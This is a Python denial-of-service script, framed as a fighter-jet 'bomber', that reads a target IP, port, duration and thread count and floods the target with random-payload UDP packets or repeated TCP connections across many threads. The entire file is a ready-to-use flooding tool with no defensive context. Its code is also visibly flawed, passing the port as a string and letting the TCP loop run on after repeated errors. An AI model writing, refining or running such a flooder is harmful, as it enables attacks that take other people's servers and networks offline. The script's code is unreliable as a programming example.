import socket,random,time,threading,signal,sys


su57 =r""" 
 |   \
 |    \                   ___
 |_____\______________.-'`   `'-.,___
/| _____     _________            ___>---
\|___________________________,.-'`
          `'-.,__________)"""

Pilot = "Aayush/Captain"

log_lock = threading.Lock()
#stop
stop = threading.Event()


def signal_handler(sig,frame):
    print("\nMission Aborted.Troops come back")
    stop.set()
    sys.exit(0)
signal.signal(signal.SIGINT,signal_handler) 


# main interface
def main_interface():
    global missiles
    print(su57)
    print("\nComodore:",Pilot,"Reporting Sir")
    print("Mode: UDP\n      TCP")
    print("Command: Mode Ip Port Duration Thread")
    missiles = input("").split()

#udp

def udp_flood(ip,port,duration,thread_id):
    timeout = time.time() + duration
    packet_count = 0
    cont = 0
    while time.time() < timeout and not stop.is_set():
        try:
            sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
            data = random._urandom(1024)
            sock.sendto(data,(ip,port))
            packet_count += 1
            print(f"Sir {packet_count} Packets Succesfully sended in Thread no. {thread_id}")
        except Exception as e:
            print(f"Error occured {e} in Thread id. {thread_id}")
            cont += 1
            continue
        if cont >=5:
            print("Error the code is not working ")
            return
    with log_lock:
        with open("UDP_Summary.txt","a") as f:
            f.write(f"Packets {packet_count} from {thread_id} Sent Using UDP Bomber Sir.\n")
    
#tcp
def tcp_flood(ip,port,duration,thread_id):
    timeout = time.time() + duration
    packet_count = 0
    cont = 0
    while time.time() < timeout and not stop.is_set():
        try:
            sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            data = random._urandom(1024)
            sock.connect((ip,port))
            sock.send(data)
            sock.close()
            packet_count += 1
            print(f"Sir {packet_count} Packets Succesfully sended in Thread no. {thread_id}")
        except Exception as e:
            print(f"Error occured {e} in Thread id. {thread_id}")
            cont += 1
            continue
        if cont >= 5:
            print("Commodore There is an error in ur Code")
    with log_lock:
        with open("TCP_Summary.txt","a") as f:
            f.write(f"Packets {packet_count} from Thread {thread_id} Send Using TCP Bomber Sir.\n")



def thread_launch(mode,ip,port,duration,threads):
  for i in range(threads):
      if mode == "udp":
          t = threading.Thread(target=udp_flood,args=(ip,port,duration,i+1))
      elif mode == "tcp":
          t = threading.Thread(target=tcp_flood,args=(ip,port,duration,i+1))
      else:
          print("Please type correct command")
          return
      t.start()
try:
    main_interface()
    mode = missiles[0].lower()
    ip = missiles[1]
    port = missiles[2]
    duration = int(missiles[3])
    threads = int(missiles[4])
    thread_launch(mode,ip,port,duration,threads)
except KeyboardInterrupt:
    signal_handler(None,None)



      